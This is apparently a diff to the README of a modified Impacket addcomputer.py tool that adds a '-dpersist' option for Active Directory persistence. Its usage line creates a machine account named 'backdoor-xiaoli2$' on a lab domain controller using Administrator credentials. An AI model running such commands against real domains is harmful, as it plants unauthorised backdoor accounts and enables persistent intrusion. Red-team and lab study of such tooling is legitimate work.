@@ -1,6 +1,6 @@
 ## Usage
 
-I just add [-dpersist] option for domain persistence. BTW, addcomputer.py default is use SAMR method to process requests.  
+I just add [-dpersist] option for AD persistence. BTW, addcomputer.py default is use SAMR method to process requests.  
 ```
 python3 ./addcomputer.py -computer-name 'backdoor-xiaoli2$' -computer-pass 'B@ckdo0r' -dpersist -dc-ip 192.168.10.90 xiaoli-vuln-2019.com/Administrator:111qqq...
 ```
